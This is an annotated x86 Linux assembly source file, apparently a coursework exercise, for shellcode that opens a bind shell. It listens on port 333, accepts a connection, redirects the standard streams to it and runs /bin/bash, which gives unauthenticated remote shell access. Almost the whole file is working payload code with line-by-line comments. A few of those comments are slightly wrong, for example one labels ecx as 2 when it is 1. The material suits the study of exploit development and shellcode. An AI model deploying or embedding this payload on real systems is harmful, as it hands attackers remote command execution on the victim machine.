
; Filename: bind.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Bind shell shellcode for Linux x86 for the SLAE course


global _start			

section .text
_start:

	;Clearing the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi

	;Socket Calls
        ;In reverse order, pushing each value to the stack:

	;Socket - creating the socket
	push eax     ; Pushing 0 for the Protocol parameter required
	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
	
	mov al, 0x66 ; Adding syscall for socketcall() to eax
	mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'

		     ; At this point, eax is set to 0x66 for the socketcall
		     ; syscall, ebx is set to 0x1 for the socket parameter
		     ; and ecx will contain the values that were pushed to 
		     ; the stack. 

	mov ecx, esp ; Moving the pointer to the stack into ecx for the final
		     ; parameters

	int 0x80     ; Interupt to call the syscall

	mov edx, eax ; Moving the File Descriptor return value to edx





	;Bind - binding the created socket to a port
	;Similar to socket, but with different parameters for the bind socketcall

	mov al, 0x66  ; eax contained the File Descriptor, now socketcall().
	mov bl, 0x2   ; Making ebx 2 for bind socketcall()	
	

	;Add parameters to stack to be used for ecx
	;For ecx - int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	;sockaddr structure
	
	push esi      ; esi should contain 0, which is pushed to the stack for INADDR_ANY (8 bytes)
    	push word 0x4d01 ; Pushing the port (333) to the stack (4 bytes)
    	push word 0x2 ; Pushing 2 to the stack for IF_INET (4 bytes)

	;addrlen
	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically

	push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes
	push ecx     ; The stack pointer 
	push edx     ; File Descriptor from socket call
	
	mov ecx, esp ; The previous value of ecx was pushed to the stack a few instructions before, this updates
		     ; ecx with the current stack pointer to the values previously pushed to the stack. 

	int 0x80     ; Interupt to call the syscall





	;Listen - listen for an incoming connection

	mov al, 0x66 ; Socketcall syscall
	mov bl, 0x4  ; Add 4 to ebx for listen 

	;ecx - int listen(int sockfd, int backlog);

	push esi     ; push 0 to stack for backlog
	push edx     ; File Descriptor still saved in edx

	mov ecx, esp ; Moving the pointer to the stack into ecx

	int 0x80     ; Interupt to call the syscall





	;Accept - accept an incoming connection

	mov al, 0x66 ; Socketcall syscall
    	mov bl, 0x5  ; add 5 to ebx for accept

	;ecx int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

	push esi     ; Push 0 to the stack as addr/addrlen are not required
	push edx     ; Push FD from edx

	mov ecx, esp ; Moving the pointer to the stack into ecx

	int 0x80     ; Interupt to call the syscall

	mov edx, eax ; As a new FD is returned, it is moved from eax to edx


	

	;dup2 - duplicate the file descriptor to redirect the incoming connection 
	;Note - this could be looped if required

	mov al, 0x3f  ; Syscall for dup2
	mov ebx, edx  ; Moving the old FD into ebx
	mov ecx, esi  ; Moving 0 into ecx for 'stdin'
	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
   	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall
	


	;execve - execute '/bin/bash' to provide a shell

    	xor eax, eax  ; Clearing eax
    	push eax      ; Pushing 0 to the stack

   	; push////bin/bash (12), could be shortened to //bin/sh (8)
    	push 0x68736162
   	push 0x2f6e6962
    	push 0x2f2f2f2f

    	mov ebx, esp ; Move stack pointer pointing to the above to ebx as a parameter (filename)
	
	xor ecx, ecx ; Null pointer for ecx argv
	xor edx, edx ; Null pointer for edx envp

    	mov al, 0xb   ; Moving 11 to eax for execve syscall
    	int 0x80      ; Interupt to call the syscall





